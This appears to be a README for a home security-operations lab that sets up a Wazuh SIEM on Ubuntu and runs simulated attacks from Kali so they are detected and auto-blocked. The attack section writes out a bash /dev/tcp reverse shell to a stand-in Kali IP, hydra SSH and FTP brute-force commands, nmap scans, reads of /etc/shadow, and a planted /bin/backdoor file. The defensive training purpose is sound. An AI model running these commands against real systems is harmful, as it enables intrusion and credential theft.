# Home SOC Lab — Wazuh SIEM + Kali Linux

A fully functional Security Operations Center (SOC) lab built on a laptop using free and open-source tools. This lab simulates real-world attacks and detects them using a SIEM with automated incident response.

---

## What This Lab Does

- Detects brute force attacks, port scans, reverse shells, and file tampering in real time
- Maps every attack to the **MITRE ATT&CK framework** automatically
- **Auto-blocks attacker IPs** via iptables when brute force is detected
- Logs every command executed on the system using **auditd**
- Visualizes everything on a custom SOC dashboard

---

## Lab Architecture

```
┌─────────────────────┐         ┌─────────────────────┐
│   Ubuntu VM         │◄────────│   Kali Linux VM      │
│   Wazuh SIEM Server │         │   Attacker Machine   │
│   IP: 192.168.x.x   │         │   PHANTOM agent      │
└─────────────────────┘         └─────────────────────┘
         ▲
         │ Monitors & Alerts
         ▼
┌─────────────────────┐
│   Wazuh Dashboard   │
│   https://localhost  │
└─────────────────────┘
```

---

## Requirements

| Component | Spec |
|-----------|------|
| RAM | 12GB (3GB Ubuntu + 2GB Kali) |
| Hypervisor | VMware Workstation / VirtualBox |
| Ubuntu | 22.04 Desktop |
| Kali Linux | Latest |
| Network | Host-Only + NAT (dual adapter) |

---

## Setup Guide

### Phase 1 — Network Configuration

Both VMs need two network adapters:
- **Adapter 1:** Host-Only (for internal lab communication)
- **Adapter 2:** NAT (for internet access)

In VMware: `VM → Settings → Network Adapter`

Verify Ubuntu has an IP, run this command on ubuntu's terminal:
```bash
ip a
```
Note the `192.X.X.X` IP — this will be your Wazuh server address.

---

### Phase 2 — Install Wazuh on Ubuntu

Single command installs everything (Manager, Dashboard, Indexer):

```bash
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh && sudo bash wazuh-install.sh -a
```

Takes 10-15 minutes. When complete, save the admin password printed at the end. It'll automatically print this on installation:
```bash
Admin user: admin
Admin password: XXXXXXXXXX
Access: https://192.X.X.X
```
## Possible Errors:
**If indexer fails to start** (permission issue):
```bash
sudo chown -R wazuh-indexer:wazuh-indexer /etc/wazuh-indexer/
sudo systemctl restart wazuh-indexer
```

**If disk space is low:**
```bash
sudo apt autoremove -y && sudo apt clean
```

## Access the dashboard at: `https://YOUR_UBUNTU_IP(192.X.X.X)

---

### Phase 3 — Connect Kali as Agent

On the Wazuh dashboard go to `Agents → Deploy new agent` 
Choose the package according to your Linux distribution and system architecture.
For Debian-based distributions such as Kali Linux, Ubuntu, and Parrot OS, select the DEB package
#### Copy the generated command.

Run the copied command on Kali, after completion, run these commands:
```bash
sudo systemctl daemon-reload
sudo systemctl enable wazuh-agent
sudo systemctl start wazuh-agent
```

Verify the agent IP points to your Wazuh server:
```bash
sudo grep "<address>" /var/ossec/etc/ossec.conf
```
Commonly, its always correct.
If wrong, edit it, change the address to your Ubuntu IP.
Run this command on Kali Terminal to edit it:
```bash
sudo nano /var/ossec/etc/ossec.conf
```

Then restart:
```bash
sudo systemctl restart wazuh-agent
```

Kali should now appear as **active** in the Wazuh dashboard.

---

### Phase 4 — Install Auditd (Deep Logging)

On Ubuntu, install auditd for kernel-level command logging:

```bash
sudo apt install auditd -y
```

Add monitoring rules, run this command:
```bash
sudo nano /etc/audit/rules.d/audit.rules
```

and then add these lines at the bottom:
```
-a always,exit -F arch=b64 -S execve -k command_execution
-w /etc/passwd -p wa -k passwd_changes
-w /etc/shadow -p wa -k shadow_access
-w /bin/bash -p x -k shell_execution
-a always,exit -F arch=b64 -S connect -k network_connect
```

Restart auditd:
```bash
sudo systemctl restart auditd
sudo systemctl restart wazuh-agent
```
### You can now go to wazuh dashboard and explore different stuff, run some attacks using kali linux.
---

### Phase 5 — Configure Active Response (Auto-Block IP upon Brute-Force Attacks)

On Ubuntu, edit the Wazuh config:
```bash
sudo nano /var/ossec/etc/ossec.conf
```

Add this before the closing `</ossec_config>` tag:
```xml
<command>
  <name>firewall-drop</name>
  <executable>firewall-drop</executable>
  <timeout_allowed>yes</timeout_allowed>
</command>

<active-response>
  <command>firewall-drop</command>
  <location>local</location>
  <rules_id>5763</rules_id>
  <timeout>180</timeout>
</active-response>
```

Validate the config:
```bash
sudo apt install libxml2-utils -y
sudo xmllint --noout /var/ossec/etc/ossec.conf
```
If it prints nothing, everything is "okay"
Restart Wazuh manager:
```bash
sudo systemctl restart wazuh-manager
```

Now when brute force hits **8 failed SSH attempts in 120 seconds**, Wazuh auto-blocks the attacker's IP via iptables for 180 seconds.

---

## ⚔️ Attack Simulations
Download "rockyou.txt" from the browser.
### 1. SSH Brute Force
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://TARGET_IP
```
Replace `/usr/share/wordlists/rockyou.txt` with the directory where you've placed rockyou.txt file

**Detected by:** Rule 5763 — triggers active response and auto-blocks IP

### 2. Nmap Port Scan
```bash
sudo nmap -A -sS -sV -p- TARGET_IP
sudo nmap --script vuln TARGET_IP
```
**Detected by:** Port scan detection rules

### 3. Reverse Shell
On Kali (listener):
```bash
nc -lvnp 4444
```
On Ubuntu (victim):
```bash
bash -i >& /dev/tcp/KALI_IP/4444 0>&1
```
ubuntu's terminal will disappear and it will be on kali. Then you can control ubuntu's terminal on kali.
**Detected by:** Auditd network connection rules

### 4. Post-Exploitation Commands (via reverse shell)
```bash
cat /etc/passwd
cat /etc/shadow
ps aux
netstat -an
```
**Detected by:** Auditd file access monitoring

### 5. File Integrity Tampering
```bash
sudo touch /etc/hacked.txt
sudo touch /bin/backdoor
sudo chmod +x /bin/backdoor
```
**Detected by:** Wazuh FIM (File Integrity Monitoring)

### 6. FTP Brute Force
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP
```

---

## Verify Active Response is Working

After running brute force, check if attacker IP was blocked, run this command on ubuntu:
```bash
sudo iptables -L -n | grep DROP
```

You should see the attacker's IP in the DROP rules.

---

## Custom Dashboard Setup

### Import pre-built Wazuh dashboards:
Run this on ubuntu to download:
```bash
wget https://packages.wazuh.com/integrations/opensearch/4.x-2.x/dashboards/wz-os-4.x-2.x-dashboards.ndjson
```

Go to: `https://YOUR_IP/app/management/opensearch-dashboards/savedObjects`

Click **Import** → select the downloaded file.

**Recommended panels for SOC dashboard:**
- Total Alerts
- Alert Level Evolution
- Top MITRE ATT&CKS
- Authentication Failure
- Authentication Success
- Security Alerts Main
- High Severity Alerts

---

## MITRE ATT&CK Coverage

| Technique | ID | Description |
|-----------|-----|-------------|
| Brute Force | T1110 | SSH password spraying via Hydra |
| Brute Force: Password Guessing | T1110.001 | Credential access attempts |
| Remote Services: SSH | T1021.004 | Lateral movement via SSH |
| Command & Scripting | T1059 | Reverse shell execution |
| OS Credential Dumping | T1003 | /etc/shadow access attempt |
| Network Service Scanning | T1046 | Nmap port scanning |

---

## 🛠️ Troubleshooting

| Issue | Fix |
|-------|-----|
| Wazuh indexer won't start | `sudo chown -R wazuh-indexer:wazuh-indexer /etc/wazuh-indexer/` |
| Dashboard shows "not ready" | Wait 5 mins, restart dashboard service |
| Agent not connecting | Check `<address>` in `/var/ossec/etc/ossec.conf` |
| Hydra getting connection refused | Wazuh blocked the IP — run `sudo iptables -F` to unblock |
| Low disk space | `sudo apt autoremove -y && sudo apt clean` |
| XML config error | `sudo xmllint --noout /var/ossec/etc/ossec.conf` |

---

## Results

- **16,755+** total alerts generated
- **11,206** authentication failures detected
- **Automatic IP blocking** via iptables confirmed
- **11 MITRE ATT&CK techniques** mapped
- Full SOC dashboard operational

---

## 🔗 Resources

- [Wazuh Official Docs](https://documentation.wazuh.com)
- [MITRE ATT&CK Framework](https://attack.mitre.org)
- [Wazuh Active Response](https://documentation.wazuh.com/current/user-manual/capabilities/active-response/)

---

## Disclaimer

This lab is for **educational purposes only**. All attacks were performed in an isolated virtual environment on systems I own. Never use these techniques on systems without explicit permission.

---

*Built with 🔥 and a lot of broken configs*
